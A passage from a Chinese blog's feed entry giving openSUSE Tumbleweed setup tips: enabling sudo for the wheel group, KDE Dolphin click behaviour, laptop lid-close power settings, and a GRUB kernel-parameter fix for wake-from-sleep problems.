root 进行特权操作"></a>使用个人账户而非 root 进行特权操作</h3><p>笔者个人以前的使用习惯是 root 账户和个人账户使用不同的密码，然后要进行特权操作都是以个人账户的身份 <code>sudo</code> 进行，但在 openSUSE 下默认会重定向到使用 root 账户：</p><p><img src="https://s2.loli.net/2024/07/03/fkyPXi243wSGB6I.png" alt="在 VM 新截的图"></p><blockquote><p>注：这也是 Linus 当年<a href="https://forums.opensuse.org/t/linus-on-opensuse/78107">舍弃 openSUSE 的原因</a>，这个非常规的权限管控理念确实有点谔谔</p></blockquote><p>解决方案是编辑 sudo 配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">EDITOR=vim sudoedit /usr/etc/sudoers</span><br></code></pre></td></tr></table></figure><p>找到如下这一行，改成这样（去掉前面的 <code>#</code> 注释符）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sudo">## Uncomment to allow members of group wheel to execute any command<br>%wheel ALL=(ALL:ALL) ALL<br></code></pre></td></tr></table></figure><h3 id="单击选中而非打开"><a href="#单击选中而非打开" class="headerlink" title="单击选中而非打开"></a>单击选中而非打开</h3><p>KDE Dolphin 经典配置了，不过笔者更习惯 Windows 那样的单击选择双击打开的模式，这里只需要在系统设置中的 <code>Workspace Behaviour-&gt;General Behaviour</code> 中勾选 <code>Selects them</code> 即可</p><h3 id="笔记本盒盖行为优化"><a href="#笔记本盒盖行为优化" class="headerlink" title="笔记本盒盖行为优化"></a>笔记本盒盖行为优化</h3><p>KDE 桌面默认是盒盖后锁屏（Lock Screen），但是在 <code>System Setting-&gt;Hardware-&gt;Power Management</code> 中的 <code>Energy Saving</code> 中可以更改笔记本盒盖行为，常用的应该就是：</p><ul><li>Sleep：传统睡眠，保留内存和一些基本组建的供电</li><li>Hybrid Sleep：混合睡眠，简而言之就是数据留内存的同时写入硬盘，主要针对台式机可能会突发断电的情况</li><li>Hibernate：传统休眠，内存数据转存到硬盘上，电源关闭进入低功耗模式</li></ul><h1 id="0x08-一些问题解决"><a href="#0x08-一些问题解决" class="headerlink" title="0x08. 一些问题解决"></a>0x08. 一些问题解决</h1><h3 id="笔记本休眠-盒盖后无法唤醒"><a href="#笔记本休眠-盒盖后无法唤醒" class="headerlink" title="笔记本休眠&#x2F;盒盖后无法唤醒"></a>笔记本休眠&#x2F;盒盖后无法唤醒</h3><p>笔者这边看 journalctl 似乎是 N 卡的问题（ <del>so nvidia, fxck you!</del> ），在 <code>/etc/default/grub</code> 中的 <code>GRUB_CMD_LINUX</code> 中加入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">acpi_rev_override</span>=1 <span class="hljs-attribute">acpi_osi</span>=Linux <span class="hljs-attribute">mem_sleep_default</span>=deep<br></code></pre></td></tr></table></figure><p>之后通过如下命令更新 grub 配置即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></code></pre></td></tr></table></figure><!--0x09. 使用 Docker 搭建深度学习环境 很多时候我们希望保证计算机主环境的整洁与完整性，毕竟万一某一天配各种软件把依赖给搞崩了就比较尴尬了，因此很多任务我们其实可以直接通过 Docker 来完成，虽然 openSUSE 自己也有深度学习框架，但是真用 openSUSE 来搞深度学习的终究是少数（国人就更少了），相对应地在网上的资料也比较少，因此我们这里选择使用 Ubuntu 镜像来搭建容器环境，毕竟搞机器学习的最重要的**就是那张卡**，而不是各种奇怪的系统环境-->]]></content>
    
    
    <summary type="html">&lt;p&gt;你说🉐对，但是 Arch Linux 是由 Arch 社区开发的一个 Linux 发行版…&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="openSUSE" scheme="https://arttnba3.github.io/tags/openSUSE/"/>
    
    <category term="openSUSE Tumbleweed" scheme="https://arttnba3.github.io/tags/openSUSE-Tumbleweed/"/>
    
  </entry>
  
</feed>
